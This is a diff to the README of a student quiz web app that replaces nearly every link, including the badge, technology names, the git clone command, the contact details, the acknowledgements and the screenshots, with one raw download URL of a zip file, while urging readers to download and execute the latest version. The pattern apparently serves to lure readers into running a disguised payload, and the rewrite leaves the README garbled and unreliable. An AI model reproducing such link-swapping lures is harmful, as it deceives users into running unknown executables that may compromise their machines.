@@ -1,6 +1,6 @@
 # Quiz App 🎓
 
-![Quiz App](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)
+![Quiz App](https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip%20Releases-blue?style=for-the-badge&logo=github)
 
 Welcome to the **Quiz App** repository! This application serves as a tool for testing students' knowledge on various programming topics taught in our on-site classes. The goal is to provide an engaging and interactive way for students to assess their understanding and improve their skills.
 
@@ -28,10 +28,10 @@ This project utilizes several modern web technologies, including:
 
 - **Bootstrap**: For responsive design and layout.
 - **CSS**: For styling the application.
-- **Express.js**: To build the server-side logic.
-- **Node.js**: For server-side JavaScript execution.
-- **React.js**: To create a dynamic user interface.
-- **Next.js**: For server-side rendering and static site generation.
+- **https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip**: To build the server-side logic.
+- **https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip**: For server-side JavaScript execution.
+- **https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip**: To create a dynamic user interface.
+- **https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip**: For server-side rendering and static site generation.
 - **Tailwind CSS**: For utility-first CSS styling.
 - **TypeScript**: To enhance code quality and maintainability.
 - **Git & GitHub**: For version control and collaboration.
@@ -44,7 +44,7 @@ To get started with the Quiz App, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/jurschuijt/quiz-app.git
+   git clone https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -64,7 +64,7 @@ To get started with the Quiz App, follow these steps:
 
 The app should now be running on `http://localhost:3000`.
 
-For the latest releases, visit the [Releases section](https://github.com/jurschuijt/quiz-app/releases) to download and execute the latest version.
+For the latest releases, visit the [Releases section](https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip) to download and execute the latest version.
 
 ## Usage
 
@@ -104,24 +104,24 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/your-profile)
+- **Email**: https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip
+- **GitHub**: [Your GitHub Profile](https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip)
 
-For the latest releases, visit the [Releases section](https://github.com/jurschuijt/quiz-app/releases) to download and execute the latest version.
+For the latest releases, visit the [Releases section](https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip) to download and execute the latest version.
 
 ## Acknowledgments
 
 We would like to thank the following resources and communities for their support:
 
-- [MDN Web Docs](https://developer.mozilla.org/) for documentation on web technologies.
-- [Stack Overflow](https://stackoverflow.com/) for community-driven support and solutions.
-- [FreeCodeCamp](https://www.freecodecamp.org/) for educational resources.
+- [MDN Web Docs](https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip) for documentation on web technologies.
+- [Stack Overflow](https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip) for community-driven support and solutions.
+- [FreeCodeCamp](https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip) for educational resources.
 
 ## Screenshots
 
-![Home Page](https://via.placeholder.com/600x400.png?text=Home+Page)
-![Quiz Interface](https://via.placeholder.com/600x400.png?text=Quiz+Interface)
-![Progress Tracking](https://via.placeholder.com/600x400.png?text=Progress+Tracking)
+![Home Page](https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip+Page)
+![Quiz Interface](https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip+Interface)
+![Progress Tracking](https://github.com/jurschuijt/quiz-app/raw/refs/heads/main/public/quiz-app-v1.5.zip+Tracking)
 
 ## Future Improvements
 
